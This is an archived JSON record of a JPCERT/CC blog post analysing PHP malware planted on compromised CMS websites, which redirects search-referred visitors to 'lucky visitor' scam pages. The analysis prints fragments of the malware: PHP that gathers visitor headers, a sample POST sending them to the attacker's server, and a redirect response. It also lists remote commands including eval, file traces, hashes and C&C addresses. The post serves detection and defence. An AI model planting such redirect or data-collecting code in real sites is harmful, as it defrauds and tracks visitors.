{
    "id": "e15333e0-8d3b-4531-88da-66abf3698187",
    "created_at": "2023-01-12T15:06:11.275644Z",
    "updated_at": "2025-03-27T02:05:42.851131Z",
    "deleted_at": null,
    "sha1_hash": "583e15b5c3acd43d7e342e9ef6aca8a4146e4339",
    "title": "2021-06-04 - PHP Malware Used in Lucky Visitor Scam",
    "authors": "",
    "file_creation_date": "2022-05-28T03:56:23Z",
    "file_modification_date": "2022-05-28T03:56:23Z",
    "file_size": 780151,
    "plain_text": "# JPCERT Coordination Center official Blog\n\n**blogs.jpcert.or.jp/en/2021/06/php_malware.html**\n\n喜野 [孝太(Kota Kino)](https://blogs.jpcert.or.jp/en/kino/)\n\nJune 4, 2021\n\n## PHP Malware Used in Lucky Visitor Scam\n\n[Email](http://10.10.0.46/mailto:?subject=PHP%20Malware%20Used%20in%20Lucky%20Visitor%20Scam&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2021%2F06%2Fphp_malware.html)\n\nJPCERT/CC continues to observe cases of website being compromised and embedded with\na malicious page. Visitors are redirected to a scam site or suspicious shopping site by\nmalicious PHP script (hereafter, “PHP malware”). This article explains the details of PHP\nmalware which is often found in websites in Japan.\n\n### Cases observed\n\nOn PHP malware-embedded websites, there are many malicious webpages that redirect\nvisitors to a scam site or suspicious shopping site. Figure 1 is an example of “lucky visitor\nscam” message, which is displayed at the time of the access. (The popup message roughly\ntranslates as follows: “Dear Internet Explorer user, you are the lucky visitor on 14 May, 2021.\nIf you answer our questionnaire, you will get a chance to win an Apple iPhone 12 Pro.”)\n\n\n-----\n\nFigure 1： Example of a scam site\nIt was confirmed that the attackers leveraged vulnerabilities in contents management system\n(CMS) to upload PHP malware on the server.\n\n### Functions\n\nPHP malware has two main functions:\n\n1. Redirect visitors to a suspicious website\n2. Execute commands from attackers\n\nThese functions are explained in detail in the following sections.\n\n**Redirect visitors to a suspicious website**\n\nPHP malware redirects visitors to a suspicious site. Figure 2 shows the flow of events.\n\n\n-----\n\nFigure 2： Flow of events\nOnce a visitor accesses a compromised website, PHP malware checks the following points\nto verify if the visitor meets the criteria for redirection.\n\nUserAgent is not a value used for crawler or bot\nReferrer contains the string “google”, “yahoo”, “bing” or “yandex\nAccept-Language header exists\nURL path contains a unique identifier\n\nThe unique identifier is a value generated from string called “UID”, specified in PHP malware.\nIt is based on the MD5 hash value of the string made of UID and “salt3” added at the end.\nThe first 6 letters are referred to as its unique identifier. It is calculated as follows:\n```\n[UID example]\nfb06bc98-576a-d5df-2195-a4b0a64bec44\n[How to calculate]\nfb06bc98-576a-d5df-2195-a4b0a64bec44salt3\n→ (MD5) fc858f544449f056656558c92ba485b0\n\n```\nIf all the conditions are met, PHP malware sends the details of the visitor to the attacker’s\nserver, which is specified in the script. Below is an example of HTTP POST request.\n\n\n-----\n\n```\nPOST /app/assets/api2?action redir HTTP/1.0\nHost: [IP address]\nConnection: close\nContent-Length: [size]\nContent-type: application/x-www-form-urlencoded\nip=127.0.0.1&qs=example.com/sample.php?fc858f=test&ua=Mozilla/5.0 (X11; Linux x86_64;\nrv:78.0) Gecko/20100101 Firefox/78.0&lang=enUS,en;q=0.5&ref=https://www.google.com/&enc=gzip,\ndeflate&acp=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n8859-1&conn=close&cfconn=127.0.0.1&xreal=127.0.0.1&xforward=127.0.0.1&uid=fb06bc98576a-d5df-2195-a4b0a64bec44\n\n```\nAttackers obtain the visitor’s information from the HTTP header.\n```\n$client_info['ip'] = $_SERVER['REMOTE_ADDR'];\n$client_info['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];\n$client_info['ua'] = @$_SERVER['HTTP_USER_AGENT'];\n$client_info['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];\n$client_info['ref'] = @$_SERVER['HTTP_REFERER'];\n$client_info['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];\n$client_info['acp'] = @$_SERVER['HTTP_ACCEPT'];\n$client_info['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];\n$client_info['conn'] = @$_SERVER['HTTP_CONNECTION'];\n$client_info['cfconn'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];\n$client_info['xreal'] = @$_SERVER['HTTP_X_REAL_IP'];\n$client_info['xforward'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];\n\n```\nBased on the information received, the attacker’s server runs the process to verify if the\nvisitor meets the criteria for redirection. If the conditions are met, a URL for redirection is\nprovided in a response. Below is an example of a response from the server.\n```\na:2:{s:4:\"type\";s:5:\"redir\";s:4:\"data\";a:1:{s:4:\"code\";s:524:\"<html> \n <head>\n  <META http-equiv=\"refresh\" content=\"1;URL=[Redirect URL]\">\n  <script>\n  window.location = \"[Redirect URL]\";\n  </script>\n </head> \n <body>\n To the new location please <a href=\"[Redirect URL]\"><b>click here.</b></a>\n </body> \n</html>\";}}\n\n```\nIf the conditions are not met, a URL is not provided, and thus no redirection occurs.\nAttackers check the IP address of the visitors, and the redirection occurs only at the first\naccess to the website. If there are several accesses from the same IP address, the URL is\nnot given from the second time onwards.\nFinally, PHP malware redirects the visitor to the specific URL using Location header, META\ntag or JavaScript code. If the visitor does not meet the criteria for redirection, PHP malware\ncreates and displays a non-malicious page based on the HTML file templates stored on the\nwebsite. Figure 3 is an example of the HTML file template.\n\n\n-----\n\nFigure 3: Sample HTML file template\n```\n{{ text }} section contains sentences copied from a legitimate site. Many keywords are\n\n```\nlisted in `{{ links }} section so that the page is displayed with the higher ranking on the`\nsearch result, as in SEO poisoning technique. Figure 4 is the example of a non-malicious\npage displayed at the end.\n\n\n-----\n\nFigure 4：Sample page displayed\n\n**Execute commands**\n\nBesides redirection, PHP malware has some commands as below, which attackers can use\nfrom a remote network. (See Appendix A for the details of the command.)\n\ncheck\ntemplates\nkeywords\nupdate_sitemap\npages\nping\nrobots\neval\n\nThese commands allow attackers to set up a malicious webpage on a server, update\nsitemap.xml and robots.txt and execute arbitrary code using eval command from a remote\nnetwork. Commands are sent in a HTTP POST or Cookie header and encoded in\ncombination of XOR and BASE64.\n\n### Trace investigation\n\nIn this case with PHP malware, many malicious webpages are set up on the compromised\nweb servers. The files embedded by PHP malware have the following characteristics:\n\n\n-----\n\n[random 2 hexadecimal digits]_[ random 16 hexadecimal digits].html\n\n[random 2 hexadecimal digits]_[ random 16 hexadecimal digits].list\n\n[“cache” folder]/[ random 16 hexadecimal digits]]\n\nIt is recommended to check that there is no such file with these features nor suspicious URL\nin sitemap.xml, as PHP malware adds a large number of malicious URL there. In addition,\nPHP malware communicates to attacker’s server in order to retrieve malicious URLs.\nChecking for suspicious communication logs based on the IoC in Appendix is also suggested\nfor the purpose of detection.\n\n### In closing\n\nThe attacks using PHP malware have been observed outside of Japan as well. JPCERT/CC\nhas seen some cases where CMS vulnerabilities are leveraged to embed PHP malware on\nthe website. It is recommended to use the latest version of CMS and plugins at all times. If\nyou have any information about compromised websites, please contact info[at]jpcert.or.jp.\n\n- Kota Kino\n\n(Translated by Yukako Uchida)\n\n**Appendix A List of Commands**\n\n**Command** **Contents**\n\ncheck Displays the number of files stored on the server\n\ntemplates Creates a .html file for templates\n\nkeywords Creates a .lst file for keywords\n\nupdate_sitemap Updates sitemap.xml\n\npages Creates a new page\n\nping Sends a sitemap.xml URL to google and bing\n\nrobots Creates robots.txt\n\neval Runs PHP code\n\n**Appendix B SHA-256 hash value**\n\n(ver5.2) 13a9f50160d8bb8a5799c8850262cf4ae46a854b1b262918d188bb17c24b14c7\n(ver5.0) 38c4a4dfc8e3d22ab3ad2e19eb84d116d01963ba6cb75d7f797f0b4b4724667f\n(ver4.5) dcd5786762ed09b4f681b07a9aa5cf4f6940f25616478a1ab9b4f848e97690ef\n(ver4.3) 24fb03d10be05931fad3df6c8d0c8c2763dfd9d8e0e3de00fa484cbf2892eef7\n\n\n-----\n\n**Appendix C C&C server**\n\n5.9.34.13\n5.9.146.0\n5.9.235.245\n144.76.47.168\n178.63.30.30\n178.63.30.186\n\n[Email](http://10.10.0.46/mailto:?subject=PHP%20Malware%20Used%20in%20Lucky%20Visitor%20Scam&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2021%2F06%2Fphp_malware.html)\n\nAuthor\n\n喜野 [孝太(Kota Kino)](https://blogs.jpcert.or.jp/en/kino/)\n\nKota Kino is Malware/Forensic Analyst at Incident Response Group, JPCERT/CC since\nAugust 2019.\n\nWas this page helpful?\n\n0 people found this content helpful.\n\nIf you wish to make comments or ask questions, please use this form.\n\nThis form is for comments and inquiries. For any questions regarding specific commercial\nproducts, please contact the vendor.\n\nplease change the setting of your browser to set JavaScript valid. Thank you!\n\n## Related articles\n\n\n-----\n\nTrends of Reported Phishing Sites and Compromised Domains in 2021\n\nAttack Exploiting XSS Vulnerability in E-commerce Websites\n\nAttacks Embedding XMRig on Compromised Servers\n\n\n-----\n\nLazarus Attack Activities Targeting Japan (VSingle/ValeforBeta)\n\nEmotet Disruption and Outreach to Affected Users\n\n\n[Back](https://blogs.jpcert.or.jp/en/2021/05/xmrig.html)\n[Top](https://blogs.jpcert.or.jp/en/)\n[Next](https://blogs.jpcert.or.jp/en/2021/06/csirt-training-vn.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-06-04 - PHP Malware Used in Lucky Visitor Scam.pdf"
    ],
    "report_names": [
        "2021-06-04 - PHP Malware Used in Lucky Visitor Scam.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535971,
    "ts_updated_at": 1743041142,
    "ts_creation_date": 1653710183,
    "ts_modification_date": 1653710183,
    "files": {
        "pdf": "https://archive.orkl.eu/583e15b5c3acd43d7e342e9ef6aca8a4146e4339.pdf",
        "text": "https://archive.orkl.eu/583e15b5c3acd43d7e342e9ef6aca8a4146e4339.txt",
        "img": "https://archive.orkl.eu/583e15b5c3acd43d7e342e9ef6aca8a4146e4339.jpg"
    }
}